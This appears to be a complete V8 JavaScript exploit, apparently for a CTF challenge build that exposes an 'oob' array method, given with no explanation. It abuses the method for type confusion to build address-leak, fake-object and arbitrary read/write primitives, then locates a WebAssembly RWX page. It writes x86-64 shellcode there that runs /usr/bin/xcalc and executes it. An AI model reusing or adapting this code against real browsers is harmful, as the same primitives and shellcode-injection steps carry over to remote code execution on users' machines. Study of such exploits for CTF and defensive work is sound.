var buf = new ArrayBuffer(8);
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) {
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n);
}
function itof(val) {
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}
var fl_arr = [1.1, 1.2, 1.3, 1.4];
var map_fl = fl_arr.oob();
var obj = {"A": 1.1};
var obj_arr = [obj];
var map_obj = obj_arr.oob();

function addr_of(obj_) {
    obj_arr[0] = obj_;
    obj_arr.oob(map_fl);
    let addr = obj_arr[0];
    obj_arr.oob(map_obj);
    return ftoi(addr);
}

function fakeobj(addr) {

    fl_arr[0] = itof(addr);
    fl_arr.oob(map_obj);
    let fake = fl_arr[0];
    fl_arr.oob(map_fl);
    return fake;
}


var a = [1.1, 1.2, 1.3, 1.4];
var fake = [map_fl, 1.2, 1.3, 1.4];

function aar(addr) {
    if (addr % 2n == 0) {
        addr += 1n;
    }
    let fake_ = fakeobj(addr_of(fake) - 0x20n);
    fake[2] = itof(BigInt(addr) - 0x10n);
    return ftoi(fake_[0]);
}

function fail_aaw(addr, value) {
    let fake_ = fakeobj(addr_of(fake) - 0x20n);
    fake[2] = itof(BigInt(addr) - 0x10n);
    fake_[0] = itof(BigInt(value));
}

function aaw(addr, value) {
    let buf_ = new ArrayBuffer(8);
    let dataview = new DataView(buf_);
    let buf_addr = addr_of(buf_);
    let backing = buf_addr + 0x20n;
    fail_aaw(backing, BigInt(addr));
    dataview.setBigUint64(0, BigInt(value), true);
}

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_module = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_module);

var f = wasm_instance.exports.main;
var rwx_page = aar(addr_of(wasm_instance)-1n+0x88n);

function copy_(addr, shellcode){
    let buf = new ArrayBuffer(0x100);
    let dataview = new DataView(buf);
    let buf_addr = addr_of(buf);
    let backing_store_addr = buf_addr + 0x20n;
    fail_aaw(backing_store_addr, addr);

    for (let i=0; i < shellcode.length;i++) {
        dataview.setUint32(4*i, shellcode[i], true);
    }
}

var shellcode = [0x90909090,0x90909090,0x782fb848,0x636c6163,0x48500000,0x73752fb8,0x69622f72,0x8948506e,0xc03148e7,0x89485750,0xd23148e6,0x3ac0c748,0x50000030,0x4944b848,0x414c5053,0x48503d59,0x3148e289,0x485250c0,0xc748e289,0x00003bc0,0x050f00];
copy_(rwx_page, shellcode);
f();